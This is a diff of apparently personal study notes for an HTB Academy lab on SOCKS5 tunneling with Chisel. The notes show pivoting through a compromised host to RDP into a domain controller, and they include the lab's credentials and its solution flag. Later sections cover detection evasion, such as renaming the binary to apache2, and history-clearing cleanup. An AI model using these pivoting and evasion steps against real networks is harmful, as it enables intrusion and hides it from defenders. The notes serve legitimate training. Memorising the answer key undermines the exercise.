@@ -1,26 +1,28 @@
-# **SOCKS5 Tunneling with Chisel - HTB Academy Page 13**
+# ⚡ Chisel SOCKS5 Tunneling
 
 ## **📋 Module Overview**
 
-**Purpose:** TCP/UDP tunneling using HTTP transport secured with SSH  
-**Tool:** Chisel - Go-based tunneling tool  
-**Protocol:** HTTP with SSH encryption  
-**Advantage:** Bypasses firewall restrictions, SOCKS5 proxy support  
-**Use Case:** Internal network access, traffic pivoting, RDP tunneling  
+**Purpose:** TCP/UDP tunneling using HTTP transport secured with SSH\
+**Tool:** Chisel - Go-based tunneling tool\
+**Protocol:** HTTP with SSH encryption\
+**Advantage:** Bypasses firewall restrictions, SOCKS5 proxy support\
+**Use Case:** Internal network access, traffic pivoting, RDP tunneling
 
----
+***
 
 ## **1. Introduction to Chisel**
 
 ### **What is Chisel?**
-- **Language:** Written in Go (Golang)
-- **Transport:** HTTP-based tunneling
-- **Security:** SSH encryption for data protection
-- **Proxy Support:** SOCKS4/SOCKS5 proxy functionality
-- **Modes:** Client-server and reverse tunneling
-- **Platform:** Cross-platform (Windows, Linux, macOS)
+
+* **Language:** Written in Go (Golang)
+* **Transport:** HTTP-based tunneling
+* **Security:** SSH encryption for data protection
+* **Proxy Support:** SOCKS4/SOCKS5 proxy functionality
+* **Modes:** Client-server and reverse tunneling
+* **Platform:** Cross-platform (Windows, Linux, macOS)
 
 ### **How Chisel Works**
+
 ```
 [Attack Host] ←HTTP/SSH→ [Pivot Host] ←Internal→ [Target Network]
 Chisel Client              Chisel Server           172.16.5.0/23
@@ -30,22 +32,23 @@ SOCKS5 Proxy               Port Forward            Domain Controller
 
 ### **Chisel vs Other Tunneling Tools**
 
-| **Aspect** | **Chisel** | **SSH Tunnel** | **Meterpreter** |
-|------------|------------|----------------|-----------------|
-| **Protocol** | HTTP/SSH | SSH | TCP |
-| **Firewall Bypass** | Excellent | Limited | Good |
-| **Setup Complexity** | Low | Low | Medium |
-| **Performance** | High | High | Medium |
-| **Platform Support** | Cross-platform | Limited | Windows Focus |
-| **Binary Size** | ~11MB | N/A | Large |
+| **Aspect**           | **Chisel**     | **SSH Tunnel** | **Meterpreter** |
+| -------------------- | -------------- | -------------- | --------------- |
+| **Protocol**         | HTTP/SSH       | SSH            | TCP             |
+| **Firewall Bypass**  | Excellent      | Limited        | Good            |
+| **Setup Complexity** | Low            | Low            | Medium          |
+| **Performance**      | High           | High           | Medium          |
+| **Platform Support** | Cross-platform | Limited        | Windows Focus   |
+| **Binary Size**      | \~11MB         | N/A            | Large           |
 
----
+***
 
 ## **2. Installation and Setup**
 
 ### **Method 1: Pre-built Binaries (Recommended)**
 
 #### **Download Specific Version (HTB Academy Compatible)**
+
 ```bash
 # HTB Academy requires v1.7.6 for compatibility
 wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
@@ -61,6 +64,7 @@ chmod +x chisel_1.7.6_linux_amd64
 ```
 
 #### **Download Latest Version**
+
 ```bash
 # Check latest releases
 curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | grep "browser_download_url.*linux_amd64" | cut -d '"' -f 4
@@ -74,6 +78,7 @@ chmod +x chisel_1.9.1_linux_amd64
 ### **Method 2: Build from Source**
 
 #### **Prerequisites**
+
 ```bash
 # Install Go programming language
 sudo apt update
@@ -84,6 +89,7 @@ go version
 ```
 
 #### **Clone and Build**
+
 ```bash
 # Clone Chisel repository
 git clone https://github.com/jpillora/chisel.git
@@ -97,6 +103,7 @@ ls -la chisel
 ```
 
 #### **Cross-compilation for Different Platforms**
+
 ```bash
 # Build for Windows
 GOOS=windows GOARCH=amd64 go build -o chisel.exe
@@ -109,6 +116,7 @@ GOOS=darwin GOARCH=amd64 go build -o chisel_macos
 ```
 
 ### **Binary Size Optimization**
+
 ```bash
 # Reduce binary size with build flags
 go build -ldflags="-s -w" -o chisel_small
@@ -121,11 +129,12 @@ sudo apt install upx
 upx --best chisel_small
 ```
 
----
+***
 
 ## **3. Normal Mode - Server on Pivot Host**
 
 ### **Architecture Overview**
+
 ```
 [Attack Host] → [Pivot Host] → [Internal Network]
 Chisel Client   Chisel Server   Target Systems
@@ -134,6 +143,7 @@ SOCKS5 Proxy    HTTP Listener   Domain Controller
 ```
 
 ### **Step 1: Transfer Binary to Pivot Host**
+
 ```bash
 # SCP transfer to Ubuntu pivot host
 scp chisel_1.7.6_linux_amd64 ubuntu@10.129.202.64:~/
@@ -144,6 +154,7 @@ scp chisel_1.7.6_linux_amd64 ubuntu@10.129.202.64:~/
 ```
 
 ### **Step 2: Start Server on Pivot Host**
+
 ```bash
 # SSH to pivot host
 ssh ubuntu@10.129.202.64
@@ -160,6 +171,7 @@ chmod +x chisel_1.7.6_linux_amd64
 ```
 
 ### **Step 3: Connect Client from Attack Host**
+
 ```bash
 # Start Chisel client
 ./chisel_1.7.6_linux_amd64 client -v 10.129.202.64:1234 socks
@@ -171,6 +183,7 @@ chmod +x chisel_1.7.6_linux_amd64
 ```
 
 ### **Step 4: Configure Proxychains**
+
 ```bash
 # Edit proxychains configuration
 sudo nano /etc/proxychains.conf
@@ -186,6 +199,7 @@ tail -f /etc/proxychains.conf
 ```
 
 ### **Step 5: Use Tunnel for RDP**
+
 ```bash
 # RDP to internal Domain Controller
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
@@ -195,17 +209,19 @@ proxychains rdesktop 172.16.5.19
 proxychains remmina
 ```
 
----
+***
 
 ## **4. Reverse Mode - Server on Attack Host**
 
 ### **When to Use Reverse Mode**
-- ✅ **Firewall blocks inbound connections** to pivot host
-- ✅ **NAT restrictions** prevent external access
-- ✅ **Egress-only** network policies
-- ✅ **Better OPSEC** - server on attacker-controlled host
+
+* ✅ **Firewall blocks inbound connections** to pivot host
+* ✅ **NAT restrictions** prevent external access
+* ✅ **Egress-only** network policies
+* ✅ **Better OPSEC** - server on attacker-controlled host
 
 ### **Architecture Overview**
+
 ```
 [Attack Host] ← [Pivot Host] → [Internal Network]
 Chisel Server   Chisel Client   Target Systems
@@ -214,6 +230,7 @@ SOCKS5 Listener R:socks         Domain Controller
 ```
 
 ### **Step 1: Start Reverse Server on Attack Host**
+
 ```bash
 # Start Chisel server with reverse option
 sudo ./chisel_1.7.6_linux_amd64 server --reverse -v -p 1234 --socks5
@@ -225,6 +242,7 @@ sudo ./chisel_1.7.6_linux_amd64 server --reverse -v -p 1234 --socks5
 ```
 
 ### **Step 2: Connect Reverse Client from Pivot Host**
+
 ```bash
 # On pivot host, connect with R:socks option
 ./chisel_1.7.6_linux_amd64 client -v 10.10.14.17:1234 R:socks
@@ -236,6 +254,7 @@ sudo ./chisel_1.7.6_linux_amd64 server --reverse -v -p 1234 --socks5
 ```
 
 ### **Step 3: Configure Proxychains (Same as Normal Mode)**
+
 ```bash
 # Proxychains still uses local SOCKS5 proxy
 socks5 127.0.0.1 1080
@@ -244,24 +263,27 @@ socks5 127.0.0.1 1080
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
----
+***
 
 ## **5. HTB Academy Lab Exercise**
 
 ### **Lab Challenge**
+
 **"Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer."**
 
 ### **Lab Environment**
-- **Target SSH:** Ubuntu pivot host with credentials `ubuntu:HTB_@cademy_stdnt!`
-- **Internal Network:** 172.16.5.0/23
-- **Domain Controller:** 172.16.5.19
-- **DC Credentials:** `victor:pass@123`
-- **Flag Location:** `C:\Users\victor\Documents\flag.txt`
-- **Expected Flag:** `Th3$eTunne1$@rent8oring!`
+
+* **Target SSH:** Ubuntu pivot host with credentials `ubuntu:HTB_@cademy_stdnt!`
+* **Internal Network:** 172.16.5.0/23
+* **Domain Controller:** 172.16.5.19
+* **DC Credentials:** `victor:pass@123`
+* **Flag Location:** `C:\Users\victor\Documents\flag.txt`
+* **Expected Flag:** `Th3$eTunne1$@rent8oring!`
 
 ### **Complete Lab Solution**
 
 #### **Step 1: Download Chisel v1.7.6**
+
 ```bash
 # On Pwnbox/Attack Host - download specific version
 wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
@@ -277,6 +299,7 @@ chmod +x chisel_1.7.6_linux_amd64
 ```
 
 #### **Step 2: Transfer to Pivot Host**
+
 ```bash
 # SCP transfer to spawned Ubuntu target
 scp chisel_1.7.6_linux_amd64 ubuntu@[TARGET_IP]:~/
@@ -289,6 +312,7 @@ scp chisel_1.7.6_linux_amd64 ubuntu@10.129.202.64:~/
 ```
 
 #### **Step 3: SSH to Pivot Host**
+
 ```bash
 # Connect to Ubuntu pivot host
 ssh ubuntu@[TARGET_IP]
@@ -303,6 +327,7 @@ ssh ubuntu@10.129.202.64
 ```
 
 #### **Step 4: Start Chisel Server on Pivot**
+
 ```bash
 # Make binary executable
 chmod +x chisel_1.7.6_linux_amd64
@@ -316,6 +341,7 @@ chmod +x chisel_1.7.6_linux_amd64
 ```
 
 #### **Step 5: Connect Client from Attack Host**
+
 ```bash
 # On Pwnbox - connect to Chisel server
 ./chisel_1.7.6_linux_amd64 client -v [TARGET_IP]:9001 socks
@@ -331,6 +357,7 @@ chmod +x chisel_1.7.6_linux_amd64
 ```
 
 #### **Step 6: Configure Proxychains**
+
 ```bash
 # Verify proxychains configuration
 tail -n2 /etc/proxychains.conf
@@ -346,6 +373,7 @@ sudo nano /etc/proxychains.conf
 ```
 
 #### **Step 7: RDP to Domain Controller**
+
 ```bash
 # Use proxychains to RDP through tunnel
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
@@ -358,6 +386,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 ```
 
 #### **Step 8: Retrieve Flag**
+
 ```cmd
 # In RDP session, open Command Prompt
 # Navigate to Documents folder
@@ -371,6 +400,7 @@ Th3$eTunne1$@rent8oring!
 ```
 
 #### **Lab Solution Summary**
+
 ```bash
 # Attack Host Commands:
 wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
@@ -391,11 +421,12 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 type C:\Users\victor\Documents\flag.txt
 ```
 
----
+***
 
 ## **6. Advanced Chisel Techniques**
 
 ### **Port Forwarding (Local)**
+
 ```bash
 # Forward specific port instead of SOCKS proxy
 ./chisel client 10.129.202.64:1234 3389:172.16.5.19:3389
@@ -405,6 +436,7 @@ xfreerdp /v:127.0.0.1:3389 /u:victor /p:pass@123
 ```
 
 ### **Port Forwarding (Remote)**
+
 ```bash
 # Server with reverse mode
 ./chisel server --reverse -p 1234
@@ -416,6 +448,7 @@ xfreerdp /v:127.0.0.1:3389 /u:victor /p:pass@123
 ```
 
 ### **Multiple Tunnels**
+
 ```bash
 # Server supporting multiple connections
 ./chisel server -p 1234 --socks5
@@ -426,6 +459,7 @@ xfreerdp /v:127.0.0.1:3389 /u:victor /p:pass@123
 ```
 
 ### **HTTP Proxy Mode**
+
 ```bash
 # HTTP proxy instead of SOCKS
 ./chisel server -p 1234 --proxy http://127.0.0.1:8080
@@ -434,13 +468,14 @@ xfreerdp /v:127.0.0.1:3389 /u:victor /p:pass@123
 # Proxy: 127.0.0.1:8080
 ```
 
----
+***
 
 ## **7. Troubleshooting**
 
 ### **Common Issues**
 
 #### **Version Compatibility**
+
 ```bash
 # Problem: glibc version mismatch
 ./chisel: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.32' not found
@@ -456,6 +491,7 @@ xfreerdp /v:127.0.0.1:3389 /u:victor /p:pass@123
 ```
 
 #### **Connection Issues**
+
 ```bash
 # Problem: Connection refused
 client: Connecting to ws://10.129.202.64:1234
@@ -473,6 +509,7 @@ client: dial tcp 10.129.202.64:1234: connection refused
 ```
 
 #### **SOCKS Version Mismatch (COMMON)**
+
 ```bash
 # Problem: Chisel server shows version errors
 [ERR] socks: Unsupported SOCKS version: [4]
@@ -494,6 +531,7 @@ tail -n5 /etc/proxychains4.conf
 ```
 
 #### **SOCKS Proxy Not Working**
+
 ```bash
 # Problem: proxychains connection fails
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -513,6 +551,7 @@ ProxyChains-3.1 (http://proxychains.sf.net)
 ```
 
 #### **Binary Transfer Issues**
+
 ```bash
 # Problem: SCP permission denied
 scp: /tmp/chisel: Permission denied
@@ -531,6 +570,7 @@ scp: /tmp/chisel: Permission denied
 ```
 
 ### **Performance Optimization**
+
 ```bash
 # Increase connection timeout
 ./chisel client --keepalive 30s target:1234 socks
@@ -543,11 +583,12 @@ scp: /tmp/chisel: Permission denied
 ./chisel client target:8080 socks  # SOCKS on 1080
 ```
 
----
+***
 
 ## **8. Operational Security (OPSEC)**
 
 ### **Stealth Considerations**
+
 1. **HTTP Traffic** - appears as web traffic
 2. **Custom User-Agent** - avoid detection signatures
 3. **Port Selection** - use common HTTP ports (80, 8080, 8000)
@@ -555,6 +596,7 @@ scp: /tmp/chisel: Permission denied
 5. **Binary Artifacts** - temporary files, process names
 
 ### **Detection Evasion**
+
 ```bash
 # Use common ports
 ./chisel server -p 80 --socks5        # HTTP port
@@ -569,6 +611,7 @@ cp chisel apache2
 ```
 
 ### **Cleanup Commands**
+
 ```bash
 # Remove binary artifacts
 rm -f chisel*
@@ -582,11 +625,12 @@ unset HISTFILE
 pkill -f chisel
 ```
 
----
+***
 
 ## **9. Integration with Other Tools**
 
 ### **Metasploit Integration**
+
 ```bash
 # Use Chisel SOCKS proxy with Metasploit
 echo "setg Proxies socks5:127.0.0.1:1080" > /tmp/msf_proxy.rc
@@ -599,6 +643,7 @@ exploit
 ```
 
 ### **Nmap through Tunnel**
+
 ```bash
 # Scan internal network through SOCKS proxy
 proxychains nmap -sT -Pn 172.16.5.0/24
@@ -608,6 +653,7 @@ proxychains nmap -sT -Pn -sV -p 80,443,3389 172.16.5.19
 ```
 
 ### **Web Application Testing**
+
 ```bash
 # Configure Burp Suite to use SOCKS proxy
 # Proxy settings: 127.0.0.1:1080 SOCKS5
@@ -616,35 +662,36 @@ proxychains nmap -sT -Pn -sV -p 80,443,3389 172.16.5.19
 proxychains firefox http://172.16.5.19/webapp
 ```
 
----
+***
 
 ## **10. Alternative Tools Comparison**
 
 ### **Chisel vs Similar Tools**
 
-| **Tool** | **Protocol** | **Encryption** | **Proxy Type** | **Platform** | **Size** |
-|----------|--------------|----------------|----------------|--------------|----------|
-| **Chisel** | HTTP/WebSocket | SSH | SOCKS4/5, HTTP | Cross-platform | ~11MB |
-| **SSF** | TCP | TLS | SOCKS4/5 | Cross-platform | ~15MB |
-| **ngrok** | HTTP/HTTPS | TLS | HTTP | Cross-platform | ~25MB |
-| **frp** | TCP/HTTP | TLS | Multiple | Cross-platform | ~20MB |
-| **Ligolo** | TUN/TAP | TLS | Network layer | Cross-platform | ~10MB |
+| **Tool**   | **Protocol**   | **Encryption** | **Proxy Type** | **Platform**   | **Size** |
+| ---------- | -------------- | -------------- | -------------- | -------------- | -------- |
+| **Chisel** | HTTP/WebSocket | SSH            | SOCKS4/5, HTTP | Cross-platform | \~11MB   |
+| **SSF**    | TCP            | TLS            | SOCKS4/5       | Cross-platform | \~15MB   |
+| **ngrok**  | HTTP/HTTPS     | TLS            | HTTP           | Cross-platform | \~25MB   |
+| **frp**    | TCP/HTTP       | TLS            | Multiple       | Cross-platform | \~20MB   |
+| **Ligolo** | TUN/TAP        | TLS            | Network layer  | Cross-platform | \~10MB   |
 
 ### **When to Choose Chisel**
-✅ **HTTP-friendly environments**  
-✅ **WebSocket support required**  
-✅ **SSH encryption needed**  
-✅ **Cross-platform compatibility**  
-✅ **SOCKS proxy functionality**  
-✅ **Moderate binary size acceptable**  
 
----
+✅ **HTTP-friendly environments**\
+✅ **WebSocket support required**\
+✅ **SSH encryption needed**\
+✅ **Cross-platform compatibility**\
+✅ **SOCKS proxy functionality**\
+✅ **Moderate binary size acceptable**
+
+***
 
 ## **References**
 
-- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 13
-- **Chisel GitHub**: [Official Repository](https://github.com/jpillora/chisel)
-- **Chisel Releases**: [Binary Downloads](https://github.com/jpillora/chisel/releases)
-- **Go Programming**: [Official Documentation](https://golang.org/doc/)
-- **Oxdf Blog**: [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
-- **IppSec Video**: [Reddish Box Walkthrough](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s) 
+* **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 13
+* **Chisel GitHub**: [Official Repository](https://github.com/jpillora/chisel)
+* **Chisel Releases**: [Binary Downloads](https://github.com/jpillora/chisel/releases)
+* **Go Programming**: [Official Documentation](https://golang.org/doc/)
+* **Oxdf Blog**: [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
+* **IppSec Video**: [Reddish Box Walkthrough](https://www.youtube.com/watch?v=Yp4oxoQIBAM\&t=1469s)
